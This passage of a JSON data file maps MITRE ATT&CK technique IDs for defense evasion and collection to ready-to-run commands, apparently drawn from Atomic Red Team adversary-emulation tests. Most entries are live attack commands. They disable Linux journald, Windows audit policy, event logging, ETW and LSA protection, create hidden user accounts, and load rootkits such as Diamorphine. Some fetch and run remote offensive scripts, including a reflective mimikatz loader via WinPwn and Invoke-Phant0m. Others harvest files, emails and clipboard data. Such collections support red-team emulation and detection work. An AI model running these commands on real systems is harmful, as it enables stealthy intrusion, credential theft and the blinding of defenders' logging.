            "description": "Finds a file by user name (if Disk Quotas are enabled), queries allocated ranges for a file, sets a file's short name, sets a file's valid data length, sets zero data for a file, or creates a new file. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-file\n- https://tria.ge/230601-x8x6bsgb24/behavioral2\n",
            "command": "if (-not (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\")) { New-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\" -Force } ; echo \"1234567890\" > \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\"; fsutil  file setZeroData offset=0 length=10 \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1070-2.txt\""
         },
         {
            "description": "Manages the update sequence number (USN) change journal, which provides a persistent log of all changes made to files on the volume. Upon execution, no output\nwill be displayed. More information about fsutil can be found at https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n",
            "command": "fsutil usn deletejournal /D C:"
         }
      ]
   },
   "T1562": {
      "technique_name": "Impair Defenses",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "The atomic test disables the journal logging by searching and replacing the \"Storage\" parameter to \"none\" within the journald.conf file, thus any new journal entries will only be temporarily available in memory and not written to disk\n",
            "command": "sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf"
         },
         {
            "description": "The atomic test disables the journal logging using built-in systemctl utility\n",
            "command": "sudo systemctl stop systemd-journald"
         },
         {
            "description": "The following Atomic adds a registry entry to disable LSA Protection.\n\nThe LSA controls and manages user rights information, password hashes and other important bits of information in memory. Attacker tools, such as mimikatz, rely on accessing this content to scrape password hashes or clear-text passwords. Enabling LSA Protection configures Windows to control the information stored in memory in a more secure fashion - specifically, to prevent non-protected processes from accessing that data.\nUpon successful execution, the registry will be modified and RunAsPPL will be set to 0, disabling Lsass protection.\nhttps://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#how-to-disable-lsa-protection\nhttps://blog.netwrix.com/2022/01/11/understanding-lsa-protection/\nhttps://thedfirreport.com/2022/03/21/phosphorus-automates-initial-access-using-proxyshell/  \n",
            "command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f"
         }
      ]
   },
   "T1036.005": {
      "technique_name": "Masquerading: Match Legitimate Name or Location",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Launch an executable that attempts to masquerade as a legitimate executable.\n",
            "command": "Add-Type -TypeDefinition @'; public class Test {;     public static void Main(string[] args) {;         System.Console.WriteLine(\"tweet, tweet\");     }; }; '@ -OutputAssembly \"$Env:windir\\Temp\\svchost.exe\"; Start-Process -FilePath \"$Env:windir\\Temp\\svchost.exe\""
         },
         {
            "description": "Create and execute a process from a directory masquerading as the current parent directory (`...` instead of normal `..`)\n",
            "command": "mkdir $HOME/...; cp $(which sh) $HOME/...; $HOME/.../sh -c \"echo Hello from the Atomic Red Team test T1036.005#1\""
         }
      ]
   },
   "T1036.006": {
      "technique_name": "Masquerading: Space after Filename",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Space after filename.\n",
            "command": "mkdir -p /tmp/atomic-test-T1036.006; cd /tmp/atomic-test-T1036.006; mkdir -p 'testdirwithspaceend '; /usr/bin/echo -e \"%d\\na\\n#!/usr/bin/perl\\nprint \\\"running T1035.006 with space after filename to masquerade init\\\\n\\\";\\nqx/cp \\/usr\\/bin\\/perl 'init  '/;\\nqx/'.\\/init  ' -e 'sleep 5'/;\\n.\\nwq\\n\" | ed 'testdirwithspaceend /init ' >/dev/null; chmod +x 'testdirwithspaceend /init '; './testdirwithspaceend /init '"
         }
      ]
   },
   "T1216.001": {
      "technique_name": "Signed Script Proxy Execution: Pubprn",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes the signed PubPrn.vbs script with options to download and execute an arbitrary payload.\n",
            "command": "cscript.exe /b C:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\\pubprn.vbs localhost \"script:#{remote_payload}\""
         }
      ]
   },
   "T1014": {
      "technique_name": "Rootkit",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Uses libprocesshider to simulate rootkit behavior by hiding a specific process name via ld.so.preload (see also T1574.006).\n",
            "command": "echo /usr/local/lib/libprocesshider.so | tee -a /etc/ld.so.preload; /usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo \"process hidden\""
         },
         {
            "description": "Loadable Kernel Module based Rootkit\n",
            "command": "sudo modprobe T1014"
         },
         {
            "description": "Loadable Kernel Module based Rootkit\n",
            "command": "sudo insmod PathToAtomicsFolder/T1014/bin/T1014.ko"
         },
         {
            "description": "Loads Diamorphine kernel module, which hides itself and a processes.\n",
            "command": "sudo modprobe diamorphine; ping -c 10 localhost >/dev/null & TARGETPID=\"$!\"; ps $TARGETPID; kill -31 $TARGETPID; ps $TARGETPID || echo \"process ${TARGETPID} hidden\""
         }
      ]
   },
   "T1027.001": {
      "technique_name": "Obfuscated Files or Information: Binary Padding",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Uses truncate to add a byte to the binary to change the hash.\n\nUpon successful execution, truncate will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
            "command": "truncate -s +1 /tmp/evil-binary"
         },
         {
            "description": "Uses dd to add a zero byte, high-quality random data, and low-quality random data to the binary to change the hash.\n\nUpon successful execution, dd will modify `/tmp/evil-binary`, therefore the expected hash will change.\n",
            "command": "dd if=/dev/zero bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/random bs=1 count=1 >> /tmp/evil-binary; dd if=/dev/urandom bs=1 count=1 >> /tmp/evil-binary"
         }
      ]
   },
   "T1620": {
      "technique_name": "Reflective Code Loading",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Reflectively load Mimik@tz into memory technique via function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); mimiload -consoleoutput -noninteractive"
         }
      ]
   },
   "T1564.006": {
      "technique_name": "Run Virtual Instance",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Create a simple Hyper-V VM (Windows native hypervisor) and start up the machine\nCleanup command stops and deletes the newly created VM\nhttps://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/quick-start/enable-hyper-v\nhttps://embracethered.com/blog/posts/2020/shadowbunny-virtual-machine-red-teaming-technique/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
            "command": "if ((Get-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V) { ; } else {Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V -All -Force};  ;  $VM = \"Atomic VM\"; New-VM -Name $VM -Generation 2; Set-VMFirmware $VM -EnableSecureBoot Off; Start-VM $VM"
         },
         {
            "description": "ransomware payloads via virtual machines (VM). \n[Maze ransomware](https://threatpost.com/maze-ransomware-ragnar-locker-virtual-machine/159350/)\n",
            "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxSVC.exe\" /reregserver && regsvr32 /S \"C:\\Program Files\\Oracle\\VirtualBox\\VboxC.dll\" && rundll32 \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxRT.dll,RTR3Init\" && sc create VBoxDRV binpath= \"C:\\Program Files\\Oracle\\VirtualBox\\drivers\\VboxDrv.sys\" type= kernel start= auto error= normal displayname= PortableVBoxDRV && sc start VBoxDRV"
         },
         {
            "description": "Create a simple VirtualBox VM and start up the machine\nCleanup command stops and deletes the newly created VM and associated files\nhttps://www.virtualbox.org/manual/ch08.html#vboxmanage-startvm\nhttps://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/\nhttps://attack.mitre.org/techniques/T1564/006/\n",
            "command": "\"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" createvm --name \"Atomic VM\" --register && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" modifyvm \"Atomic VM\" --firmware efi && \"C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe\" startvm \"Atomic VM\""
         }
      ]
   },
   "T1562.002": {
      "technique_name": "Impair Defenses: Disable Windows Event Logging",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
            "command": "auditpol /clear /y && auditpol /remove /allusers"
         },
         {
            "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
            "command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\Default Web Site\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true"
         },
         {
            "description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
            "command": "wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false"
         },
         {
            "description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
            "command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true"
         },
         {
            "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
            "command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable && auditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable && auditpol /set /category:\"Detailed Tracking\" /success:disable"
         },
         {
            "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n",
            "command": "\"PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe\""
         },
         {
            "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
            "command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore; $url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"; $output = \"$env:TEMP\\Invoke-Phant0m.ps1\"; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($url, $output); cd $env:TEMP; Import-Module .\\Invoke-Phant0m.ps1; Invoke-Phant0m"
         }
      ]
   },
   "T1564.002": {
      "technique_name": "Hide Artifacts: Hidden Users",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Adversaries may similarly hide user accounts in Windows. Adversaries can set the HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList Registry key value to 0 for a specific user to prevent that user from being listed on the logon screen.\nReference https://attack.mitre.org/techniques/T1564/002/ and https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/\n",
            "command": "NET USER AtomicOperator$ At0micRedTeam! /ADD /expires:never  && REG ADD \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" /v AtomicOperator$ /t REG_DWORD /d 0"
         },
         {
            "description": "Add a hidden user on macOS using IsHidden optoin\n",
            "command": "sudo dscl . -create /Users/APT IsHidden 1"
         },
         {
            "description": "Add a hidden user on macOS using Unique ID < 500 (users with that ID are hidden by default)\n",
            "command": "sudo dscl . -create /Users/APT UniqueID 333"
         }
      ]
   },
   "T1036": {
      "technique_name": "Masquerading",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "When the file is unzipped and the README.cmd file opened, it executes and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique [as reported here](https://twitter.com/ffforward/status/1481672378639912960)",
            "command": "if (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null; Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\"};  ;  Expand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force; cd \"$env:userprofile\\Downloads\\T1036\"; cmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null"
         },
         {
            "description": "It may be suspicious seeing a file copy of an EXE in System32 or SysWOW64 to a non-system directory or executing from a non-system directory.",
            "command": "copy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"; start-process \"$env:allusersprofile\\cmd.exe\"; sleep -s 5 ; stop-process -name \"cmd\" | out-null"
         }
      ]
   },
   "T1553.003": {
      "technique_name": "Subvert Trust Controls: SIP and Trust Provider Hijacking",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Registers a DLL that logs signature checks, mimicking SIP hijacking. This test uses a DLL from \nhttps://github.com/gtworek/PSBits/tree/master/SIP and registers it using regsvr32, thereby causing\nthe system to utilize it during signature checks, and logging said checks.\n",
            "command": "regsvr32.exe #{dll_payload}"
         }
      ]
   },
   "T1562.006": {
      "technique_name": "Impair Defenses: Indicator Blocking",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Emulates modification of syslog configuration.\n",
            "command": "if [ -f \"/etc/syslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog.conf; fi; if [ -f \"/etc/rsyslog.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/rsyslog.conf; fi; if [ -f \"/etc/syslog-ng/syslog-ng.conf\" ]; then sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/syslog-ng.conf; fi"
         },
         {
            "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.",
            "command": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets"
         },
         {
            "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
            "command": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" -Name Enabled  -PropertyType DWord -Value 0 -Force"
         },
         {
            "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry",
            "command": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force"
         },
         {
            "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a\n",
            "command": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender/Operational\" /v Enabled /t REG_DWORD /d 0 /f"
         },
         {
            "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry",
            "command": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0"
         },
         {
            "description": "Emulates modification of auditd configuration files\n",
            "command": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/audispd.conf; if [ -f \"/etc/auditd.conf\" ]; then sed -i '$ a #art_test_1562_006_1' /etc/auditd.conf; else sed -i '$ a #art_test_1562_006_1' /etc/audit/auditd.conf; fi ; sed -i '$ a #art_test_1562_006_1' /etc/libaudit.conf"
         }
      ]
   },
   "T1027.006": {
      "technique_name": "HTML Smuggling",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n",
            "command": "if (Test-Path \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\") { ; } else {New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction ignore | Out-Null; Invoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"};  ;  & \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\""
         }
      ]
   },
   "T1127.001": {
      "technique_name": "Trusted Developer Utilities Proxy Execution: MSBuild",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n",
            "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \"f8ed8b_vb.xml\""
         },
         {
            "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n",
            "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\msbuild.exe \"e93bc3_T1127.001.csproj\""
         }
      ]
   },
   "T1218.009": {
      "technique_name": "Signed Binary Proxy Execution: Regsvcs/Regasm",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes the Uninstall Method, No Admin Rights Required. Upon execution, \"I shouldn't really execute either.\" will be displayed.\n",
            "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"%tmp%\\T1218.009.dll\" /target:library \"aaaa08_T1218.009.cs\" && C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U %tmp%\\T1218.009.dll"
         },
         {
            "description": "Executes the Uninstall Method, No Admin Rights Required, Requires SNK. Upon execution, \"I shouldn't really execute\" will be displayed\nalong with other information about the assembly being installed.\n",
            "command": "$key = 'BwIAAAAkAABSU0EyAAQAAAEAAQBhXtvkSeH85E31z64cAX+X2PWGc6DHP9VaoD13CljtYau9SesUzKVLJdHphY5ppg5clHIGaL7nZbp6qukLH0lLEq/vW979GWzVAgSZaGVCFpuk6p1y69cSr3STlzljJrY76JIjeS4+RhbdWHp99y8QhwRllOC0qu/WxZaffHS2te/PKzIiTuFfcP46qxQoLR8s3QZhAJBnn9TGJkbix8MTgEt7hD1DC2hXv7dKaC531ZWqGXB54OnuvFbD5P2t+vyvZuHNmAy3pX0BDXqwEfoZZ+hiIk1YUDSNOE79zwnpVP1+BN0PK5QCPCS+6zujfRlQpJ+nfHLLicweJ9uT7OG3g/P+JpXGN0/+Hitolufo7Ucjh+WvZAU//dzrGny5stQtTmLxdhZbOsNDJpsqnzwEUfL5+o8OhujBHDm/ZQ0361mVsSVWrmgDPKHGGRx+7FbdgpBEq3m15/4zzg343V9NBwt1+qZU+TSVPU0wRvkWiZRerjmDdehJIboWsx4V8aiWx8FPPngEmNz89tBAQ8zbIrJFfmtYnj1fFmkNu3lglOefcacyYEHPX/tqcBuBIg/cpcDHps/6SGCCciX3tufnEeDMAQjmLku8X4zHcgJx6FpVK7qeEuvyV0OGKvNor9b/WKQHIHjkzG+z6nWHMoMYV5VMTZ0jLM5aZQ6ypwmFZaNmtL6KDzKv8L1YN2TkKjXEoWulXNliBpelsSJyuICplrCTPGGSxPGihT3rpZ9tbLZUefrFnLNiHfVjNi53Yg4='; $Content = [System.Convert]::FromBase64String($key); Set-Content $env:Temp\\key.snk -Value $Content -Encoding Byte; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe /r:System.EnterpriseServices.dll /out:\"$Env:TEMP\\T1218.009.dll\" /target:library /keyfile:$env:Temp\\key.snk aaaa08_T1218.009.cs; C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe $Env:TEMP\\T1218.009.dll"
         }
      ]
   },
   "T1216": {
      "technique_name": "Signed Script Proxy Execution",
      "tactic": "defense-evasion",
      "known implementations": [
         {
            "description": "Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.\nUpon execution, calc.exe will be launched.\n",
            "command": "C:\\windows\\system32\\SyncAppvPublishingServer.vbs \"\\n;Start-Process calc\""
         },
         {
            "description": "Executes the signed manage-bde.wsf script with options to execute an arbitrary command.\n",
            "command": "set comspec=%windir%\\System32\\calc.exe && cscript %windir%\\System32\\manage-bde.wsf"
         }
      ]
   },
   "T1115": {
      "technique_name": "Clipboard Data",
      "tactic": "collection",
      "known implementations": [
         {
            "description": "Add data to clipboard to copy off or execute commands from.\n",
            "command": "dir | clip && echo \"T1115\" > %temp%\\T1115.txt && clip < %temp%\\T1115.txt"
         },
         {
            "description": "Echo a command to clipboard and execute it",
            "command": "echo ifconfig | pbcopy; $(pbpaste)"
         },
         {
            "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Set-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\""
         },
         {
            "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n",
            "command": "apt install xclip -y; history | tail -n 30 | xclip -sel clip; xclip -o > history.txt"
         },
         {
            "description": "Utilize PowerShell to echo a command to clipboard and execute it\n",
            "command": "echo Get-Process | clip; Get-Clipboard | iex"
         },
         {
            "description": "copy the contents for the clipboard and print them",
            "command": "pbpaste\n"
         }
      ]
   },
   "T1113": {
      "technique_name": "Screen Capture",
      "tactic": "collection",
      "known implementations": [
         {
            "description": "Use screencapture command to collect a full desktop screenshot\n",
            "command": "screencapture /tmp/T1113_desktop.png"
         },
         {
            "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n",
            "command": "Add-Type -AssemblyName System.Windows.Forms; $screen = [Windows.Forms.SystemInformation]::VirtualScreen; $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height; $graphic = [Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size); $bitmap.Save(\"$env:TEMP\\T1113.png\")"
         },
         {
            "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n",
            "command": "xwd -root -out /tmp/T1113_desktop.xwd; xwud -in /tmp/T1113_desktop.xwd"
         },
         {
            "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n",
            "command": "cmd /c start /b psr.exe /start /output c:\\temp\\T1113_desktop.zip /sc 1 /gui 0 /stopevent 12; Add-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W; [W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c \"timeout 5 > NULL && psr.exe /stop\""
         },
         {
            "description": "Use screencapture command to collect a full desktop screenshot\n",
            "command": "screencapture -x /tmp/T1113_desktop.png"
         },
         {
            "description": "Use import command from ImageMagick to collect a full desktop screenshot\n",
            "command": "if import -help > /dev/null 2>&1; then : ; else sudo apt install graphicsmagick-imagemagick-compat; fi;  ;  import -window root /tmp/T1113_desktop.png"
         },
         {
            "description": "capture the contents of the screen",
            "command": "for i in {1..5}; do screencapture -t png screen-$i.png; echo \"$(cd \"$(dirname \"$1\")\"; pwd -P)/$(basename \"screen-$i.png\")\"; sleep 5; done;\n"
         }
      ]
   },
   "T1039": {
      "technique_name": "Data from Network Shared Drive",
      "tactic": "collection",
      "known implementations": [
         {
            "description": "Copy from sensitive File from the c$ of another LAN computer with powershell\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
            "command": "copy-item -Path \"\\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password\" -Destination \"$Env:TEMP\\Easter_egg.password\""
         },
         {
            "description": "Copy from sensitive File from the c$ of another LAN computer with copy cmd\nhttps://twitter.com/SBousseaden/status/1211636381086339073",
            "command": "copy \\\\127.0.0.1\\C$\\Windows\\temp\\Easter_Bunny.password %TEMP%\\Easter_egg.password"
         }
      ]
   },
   "T1005": {
      "technique_name": "Data from Local System",
      "tactic": "collection",
      "known implementations": [
         {
            "description": "This test searches for files of certain extensions and saves them to a single zip file prior to extraction.                              \n",
            "command": "$startingDirectory = \"C:\\Users\"; $outputZip = \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1005\"; $fileExtensionsString = \".doc, .docx, .txt\" ; $fileExtensions = $fileExtensionsString -split \", \"; New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null; Function Search-Files {;   param (;     [string]$directory;   );   $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {;     $fileExtensions -contains $_.Extension.ToLower();   };   return $files; }; $foundFiles = Search-Files -directory $startingDirectory; if ($foundFiles.Count -gt 0) {;   $foundFilePaths = $foundFiles.FullName;   Compress-Archive -Path $foundFilePaths -DestinationPath \"$outputZip\\data.zip\";   Write-Host \"Zip file created: $outputZip\\data.zip\";   } else {;       Write-Host \"No files found with the specified extensions.\";   }"
         },
         {
            "description": "This ability will locate directories that are cloned Git repositories.",
            "command": "for directoryname in $(find /home/ -name '.git' -type d 2>/dev/null | head -5); do\n\tprintf \"$(dirname \"$directoryname\")\\n\";\ndone;\n"
         },
         {
            "description": "See the raw content of a socket",
            "command": "curl #{remote.host.socket}\n"
         },
         {
            "description": "Grep for all emails for the given target company",
            "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"\\b[A-Za-z0-9._%+-]+@#{target.org.name}\\b\" 2>/dev/null {} \\;\n"
         },
         {
            "description": "Locate files deemed sensitive",
            "command": "find /Users -name '*.#{file.sensitive.extension}' -type f -not -path '*/\\.*' -size -500k 2>/dev/null | head -5\n"
         },
         {
            "description": "Grep for IP addresses in file system per user",
            "command": "find $(echo ~#{host.user.name}) -type f -size -500k -maxdepth 5 -exec grep -EIr -o \"(($(echo #{domain.broadcast.ip} | cut -d. -f-2))\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\" 2>/dev/null {} \\;\n"
         },
         {
            "description": "Search for valid SSH commands in the config file",
            "command": "pip install stormssh && storm list\n"
         }
      ]
   },
   "T1530": {
      "technique_name": "Data from Cloud Storage Object",
      "tactic": "collection",
      "known implementations": [
         {
            "description": "Upon successful execution, this test will utilize a wordlist to enumerate the public facing containers and blobs of a specified Azure storage account. \nSee https://www.netspi.com/blog/technical/cloud-penetration-testing/anonymously-enumerating-azure-file-resources/ . \n",
            "command": "import-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\Invoke-EnumerateAzureBlobs.ps1\"; Invoke-EnumerateAzureBlobs -base secure -permutations \"PathToAtomicsFolder\\..\\ExternalPayloads\\permutations.txt\" -outputfile \"$env:temp\\T1530Test1.txt\""
         },
         {
            "description": "Upon successful execution, this test will test for anonymous access to Azure storage containers by invoking a web request and outputting the results to a file. \nThe corresponding response could then be interpreted to determine whether or not the resource/container exists, as well as other information. \nSee https://ninocrudele.com/the-three-most-effective-and-dangerous-cyberattacks-to-azure-and-countermeasures-part-2-attack-the-azure-storage-service     \n",
            "command": "try{$response = invoke-webrequest \"https://T1530Test2.blob.core.windows.net/None/None\" -method \"GET\"}; catch [system.net.webexception]; {if($_.Exception.Response -ne $null); {$Response = $_.Exception.Response.GetResponseStream(); $ReadResponse = New-Object System.IO.StreamReader($Response); $ReadResponse.BaseStream.Position = 0; $responseBody = $ReadResponse.ReadToEnd()}; else {$responseBody = \"The storage account could not be anonymously accessed.\"}}; \"Response received for T1530Test2.blob.core.windows.net/None/None: $responsebody\" | out-file -filepath $env:temp\\T1530Test2.txt -append"
         },
         {
            "description": "Upon successful execution, this test will test for anonymous access to AWS S3 buckets and dumps all the files to a local folder. \n",
            "command": "aws --no-sign-request s3 cp --recursive s3://redatomic-test2 /tmp/redatomic-test2"
         }
      ]
   },
   "T1119": {
      "technique_name": "Automated Collection",
      "tactic": "collection",
      "known implementations": [
         {
            "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n",
            "command": "Get-Service > $env:TEMP\\T1119_1.txt; Get-ChildItem Env: > $env:TEMP\\T1119_2.txt; Get-Process > $env:TEMP\\T1119_3.txt"
         },
         {
